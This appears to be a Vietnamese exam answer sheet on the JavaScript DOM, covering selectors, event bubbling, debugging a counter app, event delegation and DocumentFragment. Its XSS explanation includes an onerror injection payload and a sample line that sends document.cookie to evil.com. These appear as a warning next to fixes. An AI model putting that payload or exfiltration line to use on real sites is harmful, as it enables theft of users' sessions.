## PHẦN A — KIỂM TRA ĐỌC HIỂU

---

### Câu A1 (5đ) — DOM Tree

#### 1. Sơ đồ cây DOM

```
document
└── html
    └── body
        └── div#app
            ├── header
            │   ├── h1  →  "Todo App"
            │   └── nav
            │       ├── a.active  →  "All"
            │       ├── a  →  "Active"
            │       └── a  →  "Completed"
            └── main
                ├── form#todoForm
                │   ├── input#todoInput  [type="text"]
                │   └── button  →  "Add"  [type="submit"]
                └── ul#todoList
                    ├── li.todo-item  →  "Learn HTML"
                    └── li.todo-item.completed  →  "Learn CSS"
```

#### 2. querySelector cho từng yêu cầu

```javascript
// Chọn thẻ <h1>
document.querySelector("h1");

// Chọn input trong form
document.querySelector("#todoForm input");
// hoặc: document.querySelector("#todoInput");

// Chọn tất cả .todo-item
document.querySelectorAll(".todo-item");

// Chọn link đang active
document.querySelector("a.active");
// hoặc: document.querySelector("nav .active");

// Chọn <li> đầu tiên trong #todoList
document.querySelector("#todoList li");
// hoặc: document.querySelector("#todoList .todo-item");

// Chọn tất cả <a> bên trong <nav>
document.querySelectorAll("nav a");
```

---

### Câu A2 (5đ) — innerHTML vs textContent

#### Sự khác nhau:

| Thuộc tính | Mô tả | Khi nào dùng |
|---|---|---|
| `textContent` | Chỉ lấy/set **text thuần túy**, không parse HTML. Mọi thẻ HTML sẽ được hiển thị nguyên văn dưới dạng text. | Dùng khi cần hiển thị nội dung text từ user input, dữ liệu không tin cậy. **An toàn tuyệt đối với XSS.** |
| `innerHTML` | Lấy/set **HTML string** — browser sẽ **parse và render** HTML đó. | Dùng khi cần render HTML từ nguồn **đáng tin cậy** (không phải user input), ví dụ: render template nội bộ, icon SVG, thẻ `<em>`, `<strong>`. |

**Ví dụ minh họa:**

```javascript
const el = document.querySelector("#result");
const htmlString = "<strong>Hello</strong>";

el.textContent = htmlString;
// → Hiển thị trên trang: <strong>Hello</strong>   ← text nguyên văn

el.innerHTML = htmlString;
// → Hiển thị trên trang: Hello (chữ đậm)   ← HTML được render
```

**Khi nào dùng `textContent`:**
- Hiển thị tên người dùng, bình luận, kết quả tìm kiếm — bất kỳ nội dung nào user nhập vào.
- Khi chỉ cần text thuần túy, không cần HTML.

**Khi nào dùng `innerHTML`:**
- Render template HTML tĩnh do lập trình viên tạo ra (không phải user input).
- Ví dụ: render danh sách sản phẩm từ array JS với template literal đã escape.

#### Câu hỏi bảo mật — XSS với innerHTML:

**Tại sao `innerHTML` gây lỗ hổng XSS?**

Khi dùng `innerHTML`, browser sẽ **parse và thực thi** bất kỳ HTML/JavaScript nào được truyền vào. Nếu nội dung đó đến từ user input chưa được sanitize, kẻ tấn công có thể inject script độc hại, đánh cắp cookie, session token, hoặc thực hiện các hành động thay mặt người dùng.

```javascript
// ❌ NGUY HIỂM — Lỗ hổng XSS
// Giả sử user nhập vào input: <img src=x onerror="alert('Hacked!')">
const userInput = document.querySelector("#search").value;
document.querySelector("#result").innerHTML = userInput;
// → Browser parse <img src=x onerror="alert('Hacked!')">
// → src=x không load được → onerror trigger → alert chạy!
// → Có thể thay alert bằng: fetch('https://evil.com?cookie=' + document.cookie)

// ✅ CÁCH SỬA — Dùng textContent
const userInput = document.querySelector("#search").value;
document.querySelector("#result").textContent = userInput;
// → Hiển thị nguyên văn: <img src=x onerror="alert('Hacked!')">   ← vô hại

// ✅ CÁCH SỬA 2 — Nếu bắt buộc phải dùng innerHTML, escape HTML trước
function escapeHTML(str) {
    return str
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}
document.querySelector("#result").innerHTML = escapeHTML(userInput);
```

---

### Câu A3 (5đ) — Event Bubbling

#### Phân tích code:

```html
<div id="outer">
    <div id="inner">
        <button id="btn">Click me</button>
    </div>
</div>
```

```javascript
document.querySelector("#outer").addEventListener("click", () => console.log("OUTER"));
document.querySelector("#inner").addEventListener("click", () => console.log("INNER"));
document.querySelector("#btn").addEventListener("click", (e) => {
    console.log("BUTTON");
    // e.stopPropagation();
});
```

#### Khi click vào button (KHÔNG có stopPropagation):

```
BUTTON
INNER
OUTER
```

**Giải thích:** Event bubbling — sự kiện bắt đầu từ element được click (`#btn`), sau đó **nổi bọt (bubble) lên** qua các element cha theo thứ tự: `#btn` → `#inner` → `#outer` → `document` → `window`. Mỗi element cha có addEventListener đều được kích hoạt theo thứ tự từ trong ra ngoài.

#### Khi uncomment `e.stopPropagation()`:

```
BUTTON
```

**Giải thích:** `stopPropagation()` **dừng sự kiện tại chỗ**, không cho nó nổi bọt lên các element cha nữa. Chỉ handler của `#btn` chạy, `#inner` và `#outer` không nhận được event.

---

## PHẦN C — DEBUG & PHÂN TÍCH

---

### Câu C1 (8đ) — Debug DOM Code

**Code gốc có ít nhất 7 lỗi. Dưới đây là phân tích và sửa từng lỗi:**

```javascript
// App: Counter with history
const countDisplay = document.querySelector(".count");
const historyList = document.getElementById("history");

let count = 0;

document.querySelector("#incrementBtn").addEventListener("click", function() {
    count++;
    // LỖI 1: countDisplay.innerHTML = count
    // → Nên dùng textContent thay vì innerHTML vì đây chỉ là text number
    // → innerHTML không cần thiết và không an toàn bằng textContent
    countDisplay.textContent = count;  // ✅ SỬA: dùng textContent
    
    const li = document.createElement("li");
    li.textContent = "Count changed to " + count;
    li.addEventListener("click", function() {
        deleteHistory(this);
    });
    historyList.append(li);
});

// LỖI 2: "onclick" không phải tên event hợp lệ trong addEventListener
// addEventListener nhận "click", không phải "onclick"
document.querySelector("#decrementBtn").addEventListener("click", function() {  // ✅ SỬA: "onclick" → "click"
    count--;
    countDisplay.textContent = count;  // ✅ SỬA: innerHTML → textContent (nhất quán)
});

document.querySelector("#resetBtn").addEventListener("click", () => {
    count = 0;
    // LỖI 3: countDisplay = count
    // → countDisplay là DOM element (const), không thể gán lại
    // → Phải set thuộc tính textContent để cập nhật nội dung
    countDisplay.textContent = count;  // ✅ SỬA: countDisplay = count → countDisplay.textContent = count
    
    // LỖI 4: historyList.innerHTML = null
    // → Gán null cho innerHTML không xóa nội dung đúng cách (behavior không nhất quán)
    // → Nên gán chuỗi rỗng "" để xóa tất cả nội dung
    historyList.innerHTML = "";  // ✅ SỬA: null → ""
});

function deleteHistory(element) {
    element.parentNode.removeChild(element);
}

document.querySelector("#clearHistory").addEventListener("click", () => {
    const items = historyList.querySelectorAll("li");
    items.forEach(item => {
        // LỖI 5: item.remove — thiếu dấu gọi hàm ()
        // → remove là một method, phải gọi item.remove() mới thực thi
        item.remove();  // ✅ SỬA: item.remove → item.remove()
    });
});

window.addEventListener("beforeunload", () => {
    localStorage.setItem("count", count);
    localStorage.setItem("history", historyList.innerHTML);
});

window.addEventListener("load", () => {
    // LỖI 6: localStorage.getItem trả về STRING, không phải NUMBER
    // → count cần là số để phép tính ++ -- hoạt động đúng
    // → Phải parse thành số với parseInt hoặc Number()
    const savedCount = localStorage.getItem("count");
    count = savedCount !== null ? parseInt(savedCount, 10) : 0;  // ✅ SỬA: thêm parseInt + kiểm tra null
    countDisplay.textContent = count;

    // LỖI 7: Không restore history từ localStorage
    // → Khi load, history đã được lưu nhưng không được restore lại DOM
    // → Cần restore historyList.innerHTML từ localStorage
    const savedHistory = localStorage.getItem("history");
    if (savedHistory) {
        historyList.innerHTML = savedHistory;  // ✅ SỬA: thêm restore history
        // Cần bind lại event listener cho các li đã restore
        historyList.querySelectorAll("li").forEach(li => {
            li.addEventListener("click", function() {
                deleteHistory(this);
            });
        });
    }
});
```

**Tổng kết 7 lỗi đã tìm:**

| # | Dòng | Lỗi | Sửa |
|---|---|---|---|
| 1 | `countDisplay.innerHTML = count` | Dùng innerHTML cho text thuần | → `countDisplay.textContent = count` |
| 2 | `addEventListener("onclick", ...)` | Tên event sai — "onclick" không hợp lệ | → `addEventListener("click", ...)` |
| 3 | `countDisplay = count` | Gán lại const DOM reference | → `countDisplay.textContent = count` |
| 4 | `historyList.innerHTML = null` | Gán null không xóa đúng | → `historyList.innerHTML = ""` |
| 5 | `item.remove` | Thiếu `()` gọi hàm | → `item.remove()` |
| 6 | `count = localStorage.getItem("count")` | getItem trả về string, không phải number | → `count = parseInt(localStorage.getItem("count"), 10)` |
| 7 | Không restore history khi load | Lưu nhưng không đọc lại history | → Thêm `historyList.innerHTML = savedHistory` |

---

### Câu C2 (7đ) — Performance

#### 1. Tại sao bind event lên 1000 elements riêng lẻ là BAD PRACTICE?

**Vấn đề khi bind riêng lẻ:**

- **Tốn bộ nhớ (memory):** Mỗi `addEventListener` tạo ra một event listener object trong bộ nhớ. 1000 elements = 1000 listener objects. Với list lớn hơn (10.000 items), đây là memory leak đáng kể.

- **Mất event khi render lại:** Khi thêm item mới vào list (dùng `innerHTML` hoặc `appendChild`), các elements cũ có thể bị xóa và tạo lại → tất cả event listeners mất đi, phải bind lại.

- **Chậm khi khởi tạo:** Gán 1000 event listeners tốn thời gian hơn gán 1 listener cho element cha.

**Event Delegation giải quyết thế nào:**

Event Delegation lợi dụng cơ chế **Event Bubbling**: khi click vào bất kỳ element con nào, event sẽ nổi bọt lên phần tử cha. Ta chỉ cần bind 1 listener duy nhất trên element cha, sau đó dùng `e.target` hoặc `e.target.closest()` để xác định element con nào được click.

```javascript
// ❌ BAD — 1000 listeners
document.querySelectorAll(".item").forEach(item => {
    item.addEventListener("click", handleClick);
});

// ✅ GOOD — Event Delegation: 1 listener duy nhất
document.querySelector("#list").addEventListener("click", (e) => {
    const item = e.target.closest(".item");
    if (item) handleClick(item);
});
// Tự động hoạt động với items được thêm vào sau này!
```

#### 2. Refactor dùng DocumentFragment

**Code gốc (1000 lần reflow):**

```javascript
for (let i = 0; i < 1000; i++) {
    const div = document.createElement("div");
    div.textContent = `Item ${i}`;
    document.body.appendChild(div);   // ← 1000 lần reflow!
}
```

**Vấn đề:** Mỗi lần `appendChild` vào DOM thực, browser phải tính lại layout (reflow) và vẽ lại (repaint) trang. 1000 lần append = 1000 lần reflow → cực kỳ chậm.

**Code refactor dùng DocumentFragment:**

```javascript
// ✅ DocumentFragment — chỉ gây 1 lần reflow
const fragment = document.createDocumentFragment();

for (let i = 0; i < 1000; i++) {
    const div = document.createElement("div");
    div.textContent = `Item ${i}`;
    fragment.appendChild(div);  // ← Thêm vào fragment (nằm trong bộ nhớ, KHÔNG phải DOM thực)
}

document.body.appendChild(fragment);  // ← CHỈ 1 lần thêm vào DOM thực → 1 lần reflow!
```

**Tại sao nhanh hơn:**

`DocumentFragment` là một **node đặc biệt tồn tại trong bộ nhớ (in-memory)**, không gắn vào DOM thực. Khi append các element vào fragment, browser KHÔNG tính lại layout vì fragment không hiển thị trên trang. Chỉ đến khi `document.body.appendChild(fragment)`, toàn bộ 1000 div mới được thêm vào DOM trong **một thao tác duy nhất** → browser chỉ reflow 1 lần. Kết quả: nhanh hơn cách cũ **hàng chục đến hàng trăm lần** tùy kích thước list.
